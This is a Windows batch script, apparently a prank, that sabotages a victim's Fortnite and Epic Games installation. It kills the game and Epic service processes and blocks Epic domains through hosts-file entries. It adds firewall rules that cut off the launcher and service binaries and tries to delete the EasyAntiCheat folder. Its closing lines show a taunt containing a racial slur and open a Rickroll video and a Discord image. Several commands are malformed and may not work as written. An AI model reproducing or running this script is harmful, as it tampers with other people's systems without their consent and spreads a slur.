...
title MADE BY ADIKIBERNITIKOS#9127 TO STOP THE FORTNITE CANCER
...
cls
taskkill /f /im Fortnite.exe /t
cls
taskkill /f /im EpicOnlineServices.exe /t
cls
taskkill /f /im EpicOnlineServicesInstallHelper.exe /t
cls
taskkill /f /im EpicOnlineServicesUIHelper.exe /t
cls
taskkill /f /im EpicOnlineServicesUserHelper.exe /t
cls
set hostspath=%windir%\System32\drivers\etc\hosts
echo 127.0.0.1 store.epicgames.com >> %hostspath%
echo 127.0.0.1 epicgames.com >> %hostspath%
echo 127.0.0.1 18.211.140.154 >> %hostspath%
echo 127.0.0.1 54.157.11.49 >> %hostspath%
echo 127.0.0.1 52.21.17.0 >> %hostspath%
echo 127.0.0.1 50.16.248.21 >> %hostspath%
echo 127.0.0.1 107.22.80.121 >> %hostspath%
echo 127.0.0.1 44.197.254.93 >> %hostspath%
echo 127.0.0.1 54.160.139.226 >> %hostspath%
echo 127.0.0.1 3.232.247.6 >> %hostspath%
echo 127.0.0.1 3.222.69.244 >> %hostspath%
echo 127.0.0.1 54.146.99.230 >> %hostspath%




cls
netsh advfirewall firewall add rule name=EpicGamesLauncher.exe dir=out program =C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win64\EpicGamesLauncher.exe action = block
netsh advfirewall firewall add rule name=EpicGamesLauncher.exe dir=in program =C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win64\EpicGamesLauncher.exe action = block
cls
netsh advfirewall firewall add rule name=EpicGamesLauncher.exe dir=out program =C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win32\EpicGamesLauncher.exe action = block
netsh advfirewall firewall add rule name=EpicGamesLauncher.exe dir=in program =C:\Program Files (x86)\Epic Games\Launcher\Portal\Binaries\Win32\EpicGamesLauncher.exe action = block
cls
netsh advfirewall firewall add rule name=EpicOnlineServices.exe dir=out program =C:\Program Files (x86)\Epic Games\Epic Online Services\EpicOnlineServices.exe action = block
netsh advfirewall firewall add rule name=EpicOnlineServices.exe dir=in program =C:\Program Files (x86)\Epic Games\Epic Online Services\EpicOnlineServices.exe action = block
cls
netsh advfirewall firewall add rule name=EpicOnlineServicesInstallHelper.exe dir=out program =C:\Program Files (x86)\Epic Games\Epic Online Services\EpicOnlineServicesInstallHelper.exe action = block
netsh advfirewall firewall add rule name=EpicOnlineServicesInstallHelper.exe dir=in program =C:\Program Files (x86)\Epic Games\Epic Online Services\EpicOnlineServicesInstallHelper.exe action = block
cls
netsh advfirewall firewall add rule name=EpicOnlineServicesUIHelper.exe dir=out program =C:\Program Files (x86)\Epic Games\Epic Online Services\EpicOnlineServicesUIHelper.exe action = block
netsh advfirewall firewall add rule name=EpicOnlineServicesUIHelper.exe dir=in program =C:\Program Files (x86)\Epic Games\Epic Online Services\EpicOnlineServicesUIHelper.exe action = block
cls
netsh advfirewall firewall add rule name=EpicOnlineServicesUserHelper.exe dir=out program =C:\Program Files (x86)\Epic Games\Epic Online Services\EpicOnlineServicesUserHelper.exe action = block
netsh advfirewall firewall add rule name=EpicOnlineServicesUserHelper.exe dir=in program =C:\Program Files (x86)\Epic Games\Epic Online Services\EpicOnlineServicesUserHelper.exe action = block
cls

rd C:\Program Files (x86)\EasyAntiCheat\
...
title YOUR FORTNITE IS FUCKED 100%

cls
echo YOUR FORTNITE IS FUCKED MY NIGGER
timeout 3.5 >nul
cls
start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley
cls
start https://cdn.discordapp.com/attachments/1021466525909143643/1021858081744883774/unknown.png
cls 
exit